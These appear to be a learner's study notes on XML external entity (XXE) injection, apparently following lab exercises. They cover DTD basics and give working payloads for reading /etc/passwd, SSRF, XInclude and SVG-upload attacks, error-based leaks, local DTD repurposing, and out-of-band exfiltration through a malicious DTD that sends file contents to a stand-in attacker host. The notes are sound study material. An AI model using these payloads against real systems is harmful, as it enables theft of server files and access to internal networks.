XML external entity (XXE) injection:
- Allow attacker to interact or view files with filesystem through XML data
- Attacker can compromise the underlying server or other BE infracstructure, by leveraging vuln to perform SSRF attacks

XML (extensible markup language):
- Used for storing and transporting data like html
- Uses tree structure of tags and data
- Unlike html, xml does not use predefined tags, so tags can be given names that describe data
- X in AJAX stand for xml, popular before json format appear
- DTD: document type definition
+ Declared within the optional DOCTYPE at the start of XML document
+ It can be fully self-contained itself (internal DTD) or can be loaded from elsewhere (external DTD) or can hybrid of two
- Custom entities:
    <!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>
    + Any usage of entity &myentity; will be replace with "my entity value"
- External entities:
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
    <!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

Types of XXE attacks:
- Exploiting XXE to retrieve files: external entity containing the contents of a file and return in application response
+ <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
- Exploiting XXE to perform SSRF attacks: external entity is defined based on url to BE system
+ <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
- Exploiting blind XXE exfiltrate data out-of-band: sensitive data transmitted to attacker server
+ Trigger out-of-band network interaction or trigger xml parsing error in such a way that error message contain sensitive data
+ Detecting: 
    <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> ]>
    <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>   (when regular entities are blocked)
+ Store a malicious DTD in attacker server, victim server will parse it, then execute and return to attacker server (case victim block entity but it from external)
- Exploiting blind XXE to retrieve data via error messages: trigger parsing error messages contain sensitive data
+ Trigger using external DTD

Finding hidden attack surface for XXE injection
+ XInclude attacks:
    + XInclude is a part of the XML specification that allows an XML document to be built from sub-documents.
        <foo xmlns:xi="http://www.w3.org/2001/XInclude">
        <xi:include parse="text" href="file:///etc/passwd"/></foo>
+ XXE attacks via file upload:
    + File using xml-based format: docx(documnt), svg(image)
    + Even if application only expect png, jpeg. It could still support svg image file 
    + Using xml payload in svg file to injection upload file
+ XXE attacks via modified content type:
    + Most POST requests use a default content type that is generated by HTML forms, such as 'application/x-www-form-urlencoded'
    + Example: foo=bar can replace by <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>

- Description:
+ First store malicious DTD on attacker server
+ Send payload frmo victim to parse it and execute
+ After that, it will return back to attacker server through parameter

    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '{exploit_url}?x=%file;'>">
    %eval;
    %exfiltrate;

- Description:
+ First we need to store vuln xml in attacker server to trigger nonexistent file, encode % -> &#x25 to avoid execute instant when call %exfil
    + Only when victim server receive this, this execute
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
    %eval;
    %exfil;
+ Sent vuln xml payload from victim server to download vuln script
+ It's trigger error when calling nonexistent file and return error messages

09_Exploiting_XXE_to_retrieve_data_by_repurposing_a_local_DTD
- Find internal dtd file -> Using entity defined -> Change it to extract sensitive data
- Description:
+ Like lab description, it has this file "/usr/share/yelp/dtd/docbookx.dtd" and entity named ISOamso
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+ So we just have to overide this entity.
    <!ENITTY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "
            <!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>
        ">
        &#x25;eval;
        &#x25;error;
    '>
+ Note: must url encoding entity name to make it different and not trigger when calling that
